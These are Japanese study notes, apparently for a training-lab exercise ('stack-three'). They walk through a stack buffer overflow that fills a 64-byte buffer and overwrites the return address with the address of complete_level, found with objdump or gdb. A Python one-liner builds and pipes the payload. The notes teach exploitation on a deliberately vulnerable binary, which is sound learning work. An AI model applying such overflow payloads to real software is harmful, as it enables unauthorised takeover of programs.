[方針]
'A' * 64 によって buffer[64]の64byteを適当に埋める。
その上でcomplete_level関数のアドレスをリトルエンディアンにしてBOF。

[入力方法]
python3 -c 'import sys, struct; payload = b"A"*64 + struct.pack("<Q", 0x5555555551c9);
     sys.stdout.buffer.write(payload)' | ./stack-three.out

[解説]
import sys, struct; == sysモジュールとstructモジュールのインポート。

import A		== 外部モジュール、ライブラリを使えるようにするだけ。#include的な存在。
structモジュール	== バイト列(生のバイナリの羅列)に意味を与えるデータ構造(data STRUCTure)を適応したり
			   敢えて外したりするようなモジュール。
			   バイト列(生のバイナリの羅列)と値(数値や文字など)の変換装置的存在。

バイト列		== 01110000 01110111 01101110 00100001//生のバイナリの羅列の具体例
                	== b'\x70\x77\x6e\x21'

			これを「char型の配列」というデータ構造を適応すると、
			* 0x70 -> 'p'
			* 0x77 -> 'w'
			* 0x6e -> 'n'
			* 0x21 -> '!'

			これを「32bit符号なし整数」というデータ構造を適応すると、(要するに数値)
			* 16進数: 0x70776e21
			* 10進数: 1,886,875,169

			その数値をアドレスとして解釈すると
			* アドレス: 0x70776e21
			

			//すべて同じバイト列なのに、適応されたデータ構造によって様々な解釈へ変換できましたね！

	
sysモジュール		== pythonという、高級言語であるが故にpcの生々しい低レイヤな部分が無視できるような
			   「無菌室」、すなわち「Pythonインタプリンタの実行コンテキスト」に対して、
			   その「生々しい低レイヤ」、すなわち「スクリプトが起動しているシステムの詳細
			   Pythonインタプリンタ自体の設定や状態、スクリプトへの入力」を教えるモジュール。

			== [要約]高レイヤなPythonを低レイヤに扱うモジュール。

struct.pack("<Q", 0x5555555551c9) == structモジュールはバイト列と値の変換装置でした。
				     0x5555555551c9という[値]をリトルエンディアンの[バイト列]に変換します。
				     0x00005555555551c9 -> b'\xc9\x51\x55\x55\x55\x55\x00\x00'
				     へと変換します。
				     16進数の数値という[値]で書かれたアドレスを、リトルエンディアンの[バイト列]
				     で書かれたアドレスへ変換しました。
				     これで、complete_level関数アドレスを直に上書きすることができますね！

sys.stdout.buffer.write(payload)  == sysモジュールは低レイヤのまま、生な操作をするものでした。
				     payloadを生なバイト列のまま入力します。
				     



//////////////////////////////////////////////////////////////////////////////

パターンＡ
objdump -d stack-three.out | grep "<complete_level>:"

パターンB
1...gdb stack-three.out
2...start
3...p complete_level

いずれかの方法によってcomplete_levelのアドレスを獲得。

  ////////////////////////////////////////////
  //complete_level関数のアドレスの獲得の仕方//
  ////////////////////////////////////////////

  /* 静的な方法と動的な方法がある。
   * 静的な方法 == 実際に実行はせず、使われるであろう関数アドレスを解析。
   * 動的な方法 == 実際に実行し、実際に使われた関数アドレスを解析。
   */

  //////////////////
  //静的な解析方法//
  //////////////////

  /* objdump -d stack-three.out | grep "<complete_level>:"
   * objdump    == 実行ファイル等の情報を表示するコマンド。
   * -d         == -disassembleのこと。機械語をアセンブリ言語に変換する。
   * |          == パイプ。左の出力を右へ入力する。
   * grep "A"   == たくさんの文字列からAと一致する文字列を探して表示する。
   */

  //////////////////
  //動的な解析方法//
  //////////////////

  /* 1... gdb stack-three.out
   * 2... start
   * 3... p &complete_level
   *
   * gdb        == デバッグコマンド。プログラムを実行させ、途中で止めたり、
   *               途中の変数の値を見たり、プログラムの実際の動きを見れる。
   * start      == プログラムを仮に実行。
   * p &関数名  == 指定した関数のアドレスをprintする(pはprintのp！)
   *               (C言語では&変数が変数のアドレスを表しますね！)
   */

